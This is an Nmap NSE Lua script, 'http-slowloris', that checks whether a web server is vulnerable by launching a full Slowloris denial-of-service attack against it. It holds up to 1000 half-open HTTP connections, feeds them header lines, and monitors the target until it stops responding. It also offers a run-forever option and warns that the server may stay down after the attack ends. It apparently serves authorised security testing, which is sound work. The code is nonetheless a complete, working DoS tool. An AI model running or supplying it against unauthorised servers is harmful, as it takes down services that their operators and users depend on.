local coroutine = require "coroutine"
local math = require "math"
local nmap = require "nmap"
local os = require "os"
local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local comm = require "comm"

description = [[
Tests a web server for vulnerability to the Slowloris DoS attack by launching a Slowloris attack.

Slowloris was described at Defcon 17 by RSnake
(see http://ha.ckers.org/slowloris/).

This script opens and maintains numerous 'half-HTTP' connections until
the server runs out of ressources, leading to a denial of service. When
a successful DoS is detected, the script stops the attack and returns
these pieces of information (which may be useful to tweak further
filtering rules):
* Time taken until DoS
* Number of sockets used
* Number of queries sent
By default the script runs for 30 minutes if DoS is not achieved.

Please note that the number of concurrent connexions must be defined
with the <code>--max-parallelism</code> option (default is 20, suggested
is 400 or more) Also, be advised that in some cases this attack can
bring the web server down for good, not only while the attack is
running.

Also, due to OS limitations, the script is unlikely to work
when run from Windows.
]]

---
-- @usage
-- nmap --script http-slowloris --max-parallelism 400  <target>
--
-- @args http-slowloris.runforever Specify that the script should continue the
-- attack forever. Defaults to false.
-- @args http-slowloris.send_interval Time to wait before sending new http header datas
-- in order to maintain the connection. Defaults to 100 seconds.
-- @args http-slowloris.timelimit Specify maximum run time for DoS attack (30
-- minutes default).
--
-- @output
-- PORT     STATE SERVICE REASON  VERSION
-- 80/tcp   open  http    syn-ack Apache httpd 2.2.20 ((Ubuntu))
-- | http-slowloris:
-- |   Vulnerable:
-- |   the DoS attack took +2m22s
-- |   with 501 concurrent connections
-- |_  and 441 sent queries

author = "Aleksandar Nikolic, Ange Gutek"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos", "intrusive"}


portrule = shortport.http

local SendInterval
local TimeLimit


-- this will save the amount of still connected threads
local ThreadCount = 0

-- the maximum amount of sockets during the attack. This could be lower than the
-- requested concurrent connections because of the webserver configuration (eg
-- maxClients on Apache)
local Sockets = 0

-- this will save the amount of new lines sent to the half-http requests until
-- the target runs out of ressources
local Queries = 0

local ServerNotice
local DOSed = false
local StopAll = false
local Reason = "slowloris" -- DoSed due to slowloris attack or something else
local Bestopt


-- get time (in milliseconds) when the script should finish
local function get_end_time()
  if TimeLimit == nil then
    return -1
  end
  return 1000 * TimeLimit + nmap.clock_ms()
end

local function set_parameters()
  SendInterval = stdnse.parse_timespec(stdnse.get_script_args('http-slowloris.send_interval') or '100s')
  if stdnse.get_script_args('http-slowloris.runforever') then
    TimeLimit = nil
  else
    TimeLimit = stdnse.parse_timespec(stdnse.get_script_args('http-slowloris.timelimit') or '30m')
  end
end

local function do_half_http(host, port, obj)
  local condvar = nmap.condvar(obj)

  if StopAll then
    condvar("signal")
    return
  end

  -- Create socket
  local slowloris = nmap.new_socket()
  slowloris:set_timeout(200 * 1000) -- Set a long timeout so our socked doesn't timeout while it's waiting

  ThreadCount = ThreadCount + 1
  local catch = function()
    -- This connection is now dead
    ThreadCount = ThreadCount - 1
    stdnse.print_debug(SCRIPT_NAME .. " [HALF HTTP]: lost connection")
    slowloris:close()
    slowloris = nil
    condvar("signal")
  end

  local try = nmap.new_try(catch)
  try(slowloris:connect(host.ip, port, Bestopt))

  -- Build a half-http header.
  local half_http = "POST /" .. tostring(math.random(100000, 900000)) .. " HTTP/1.1\r\n" ..
    "Host: " .. host.ip .. "\r\n" ..
    "User-Agent: " .. http.USER_AGENT .. "\r\n" ..
    "Content-Length: 42\r\n"

  try(slowloris:send(half_http))
  ServerNotice = " (attack against " .. host.ip .. "): HTTP stream started."

  -- During the attack some connections will die and other will respawn.
  -- Here we keep in mind the maximum concurrent connections reached.

  if Sockets <= ThreadCount then Sockets = ThreadCount end

  -- Maintain a pending HTTP request by adding a new line at a regular 'feed' interval
  while true do
    if StopAll then
      break
    end
    stdnse.sleep(SendInterval)
    try(slowloris:send("X-a: b\r\n"))
    ServerNotice = " (attack against " .. host.ip .. "): Feeding HTTP stream..."
    Queries = Queries + 1
    ServerNotice = ServerNotice .. "\n(attack against " .. host.ip .. "): " .. Queries .. " queries sent using " .. ThreadCount .. " connections."
  end
  slowloris:close()
  ThreadCount = ThreadCount - 1
  condvar("signal")
end


-- Monitor the web server
local function do_monitor(host, port)
  local general_faults = 0
  local request_faults = 0 -- keeps track of how many times we didn't get a reply from the server

  stdnse.print_debug(SCRIPT_NAME .. " [MONITOR]: Monitoring " .. host.ip .. " started")

  local request = "GET / HTTP/1.1\r\n" ..
    "Host: " .. host.ip ..
    "\r\nUser-Agent: " .. http.USER_AGENT .. "\r\n\r\n"
  local opts = {}
  local _

  _, _, Bestopt = comm.tryssl(host, port, "GET / \r\n\r\n", opts) -- first determine if we need ssl

  while not StopAll do
    local monitor = nmap.new_socket()
    local status  = monitor:connect(host.ip, port, Bestopt)
    if not status then
      general_faults = general_faults + 1
      if general_faults > 3 then
        Reason = "not-slowloris"
        DOSed = true
        break
      end
    else
      status = monitor:send(request)
      if not status then
        general_faults = general_faults + 1
        if general_faults > 3 then
          Reason = "not-slowloris"
          DOSed = true
          break
        end
      end
      status, _ = monitor:receive_lines(1)
      if not status then
        stdnse.print_debug(SCRIPT_NAME .. " [MONITOR]: Didn't get a reply from " .. host.ip  .. "." )
        monitor:close()
        request_faults = request_faults +1
        if request_faults > 3 then
          if TimeLimit then
            stdnse.print_debug(SCRIPT_NAME .. " [MONITOR]: server " .. host.ip .. " is now unavailable. The attack worked.")
            DOSed = true
          end
          monitor:close()
          break
        end
      else
        request_faults = 0
        general_faults = 0
        stdnse.print_debug(SCRIPT_NAME .. " [MONITOR]: ".. host.ip .." still up, answer received.")
        stdnse.sleep(10)
        monitor:close()
      end
      if StopAll then
        break
      end
    end
  end
end

local Mutex = nmap.mutex("http-slowloris")

local function worker_scheduler(host, port)
  local Threads = {}
  local obj = {}
  local condvar = nmap.condvar(obj)
  local i

  for i = 1, 1000 do
    -- The real amount of sockets is triggered by the
    -- '--max-parallelism' option. The remaining threads will replace
    -- dead sockets during the attack
    local co = stdnse.new_thread(do_half_http, host, port, obj)
    Threads[co] = true
  end

  while not DOSed and not StopAll do
    -- keep creating new threads, in case we want to run the attack indefinitely
    repeat
      if StopAll then
        return
      end

      for thread in pairs(Threads) do
        if coroutine.status(thread) == "dead" then
          Threads[thread] = nil
        end
      end
      stdnse.print_debug(SCRIPT_NAME .. " [SCHEDULER]: starting new thread")
      local co = stdnse.new_thread(do_half_http, host, port, obj)
      Threads[co] = true
      if ( next(Threads) ) then
        condvar("wait")
      end
    until next(Threads) == nil;
  end
end

action = function(host, port)

  Mutex("lock") -- we want only one slowloris instance running at a single
  -- time even if multiple hosts are specified
  -- in order to have as many sockets as we can available to
  -- this script

  set_parameters()

  local output = {}
  local start, stop, dos_time

  start = os.date("!*t")
  -- The first thread is for monitoring and is launched before the attack threads
  stdnse.new_thread(do_monitor, host, port)
  stdnse.sleep(2) -- let the monitor make the first request

  stdnse.print_debug(SCRIPT_NAME .. " [MAIN THREAD]: starting scheduler")
  stdnse.new_thread(worker_scheduler, host, port)
  local end_time = get_end_time()
  local last_message
  if TimeLimit == nil then
    stdnse.print_debug(SCRIPT_NAME .. " [MAIN THREAD]: running forever!")
  end

  -- return a live notice from time to time
  while (nmap.clock_ms() < end_time or TimeLimit == nil) and not StopAll do
    if ServerNotice ~= last_message then
      -- don't flood the output by repeating the same info
      stdnse.print_debug(SCRIPT_NAME .. " [MAIN THREAD]: " .. ServerNotice)
      last_message = ServerNotice
    end
    if DOSed and TimeLimit ~= nil then
      break
    end
    stdnse.sleep(10)
  end

  stop = os.date("!*t")
  dos_time = stdnse.format_difftime(stop, start)
  StopAll = true
  if DOSed then
    if Reason == "slowloris" then
      stdnse.print_debug(2, SCRIPT_NAME .. " Slowloris Attack stopped, building output")
      output = "Vulnerable:\n" ..
        "the DoS attack took "..
        dos_time .. "\n" ..
        "with ".. Sockets .. " concurrent connections\n" ..
        "and " .. Queries .." sent queries"
    else
      stdnse.print_debug(2, SCRIPT_NAME .. " Slowloris Attack stopped. Monitor couldn't communicate with the server.")
      output = "Probably vulnerable:\n" ..
        "the DoS attack took " .. dos_time .. "\n" ..
        "with " .. Sockets .. " concurrent connections\n" ..
        "and " .. Queries .. " sent queries\n" ..
        "Monitoring thread couldn't communicate with the server. " ..
        "This is probably due to max clients exhaustion or something similar but not due to slowloris attack."
    end
    Mutex("done") -- release the mutex
    return stdnse.format_output(true, output)
  end
  Mutex("done") -- release the mutex
  return false
end
